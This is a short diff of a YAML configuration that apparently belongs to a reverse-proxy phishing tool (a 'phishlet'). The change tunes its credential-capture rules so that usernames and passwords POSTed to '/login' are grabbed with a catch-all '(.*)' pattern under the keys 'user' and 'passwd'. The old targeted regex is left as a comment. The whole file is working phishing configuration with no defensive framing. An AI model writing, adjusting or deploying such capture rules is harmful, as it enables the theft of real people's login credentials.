@@ -31,15 +31,16 @@ auth_tokens:
 credentials:
   # Username/Email capture
   username:
-    key: ''
-    search: '(?:user|username|email|id|login)"?\s*[:=]\s*"?([^"&]+)"?'
+    key: 'user'
+    search: '(.*)'
+    # search: '(?:user|username|email|id|login)"?\s*[:=]\s*"?([^"&]+)"?'
     type: 'post'
     page: '/login'
     
   # Password capture (this happens on the next step)
   password:
-    key: ''
-    search: '(?:passwd|password)"?\s*[:=]\s*"?([^"&]+)"?'
+    key: 'passwd'
+    search: '(.*)'
     type: 'post'
     page: '/login'
     
